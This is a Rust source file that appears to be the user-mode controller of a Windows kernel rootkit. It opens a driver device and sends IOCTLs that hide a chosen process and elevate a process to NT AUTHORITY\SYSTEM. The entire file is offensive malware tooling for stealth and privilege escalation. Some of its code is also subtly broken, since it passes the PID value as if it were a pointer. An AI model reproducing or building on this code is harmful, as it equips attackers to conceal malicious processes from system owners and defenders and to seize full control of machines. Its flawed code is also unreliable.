use std::ffi::c_void;

use crate::constants::{IOCTL_PROCESS_HIDE_REQUEST, IOCTL_PROCESS_PRIVILEGE_ESCALATION_REQUEST};

use windows::core::w;
use windows::Win32::Foundation::{HANDLE, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
use windows::Win32::Storage::FileSystem::CreateFileW;
use windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CREATE_ALWAYS, OPEN_EXISTING};
use windows::Win32::Storage::FileSystem::{
    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use windows::Win32::System::IO::DeviceIoControl;

pub unsafe fn contact_driver(device_name: &str) -> HANDLE {
    let device_name = w!("\\\\.\\MyDevice");
    let handle = CreateFileW(
        device_name,
        FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES(0),
        HANDLE(0 as *mut c_void),
    );

    match handle {
        Ok(handle) => handle,
        Err(error) => {
            println!("Error: {:?}", error);
            HANDLE(0 as *mut c_void)
        }
    }
}

pub unsafe fn hide_process(driver_handle: HANDLE, pid: u32) {
    let pid_ptr: *mut c_void = pid as *mut c_void;
    let pid_size = std::mem::size_of::<u32>() as u32;
    let mut output_buffer: [u8; 4] = [0; 4];
    let mut bytes_returned: u32 = 0;

    let result = DeviceIoControl(
        driver_handle,
        IOCTL_PROCESS_HIDE_REQUEST,
        Some(pid_ptr),
        pid_size,
        Some(output_buffer.as_mut_ptr() as *mut c_void),
        output_buffer.len() as u32,
        Some(&mut bytes_returned),
        None,
    );

    // TODO: maybe enhance this
    match output_buffer[0] {
        1 => println!("Successfully shadowed process PID: {:?}", pid),
        0 => println!("Process not found"),
        _ => println!("Uknown response"),
    }
}


pub unsafe fn elevate_process(driver_handle: HANDLE, pid: u32) {
    let pid_ptr: *mut c_void = pid as *mut c_void;
    let pid_size = std::mem::size_of::<u32>() as u32;
    let mut output_buffer: [u8; 4] = [0; 4];
    let mut bytes_returned: u32 = 0;

    let result = DeviceIoControl(
        driver_handle,
        IOCTL_PROCESS_PRIVILEGE_ESCALATION_REQUEST,
        Some(pid_ptr),
        pid_size,
        Some(output_buffer.as_mut_ptr() as *mut c_void),
        output_buffer.len() as u32,
        Some(&mut bytes_returned),
        None,
    );

    // TODO: maybe enhance this
    match output_buffer[0] {
        1 => println!("Successfully elevate process PID: {:?} to NT AUTHORITY\\SYSTEM", pid),
        0 => println!("Process not found"),
        _ => println!("Uknown response"),
    }
}